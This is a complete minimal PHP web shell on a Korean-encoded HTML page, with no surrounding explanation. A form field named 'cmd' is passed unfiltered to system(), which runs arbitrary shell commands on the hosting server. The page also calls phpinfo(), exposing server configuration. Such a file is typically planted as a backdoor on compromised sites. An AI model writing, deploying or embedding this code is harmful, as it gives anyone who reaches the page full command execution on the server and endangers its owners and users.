<!doctype html>
<html lang="ko">
    <head>
        <meta charset='euc-kr'>
    </head>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="submit" value="����">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
    echo "$QUERY_STRING<br>";

    phpinfo();
?>
</pre>
</body>
</html>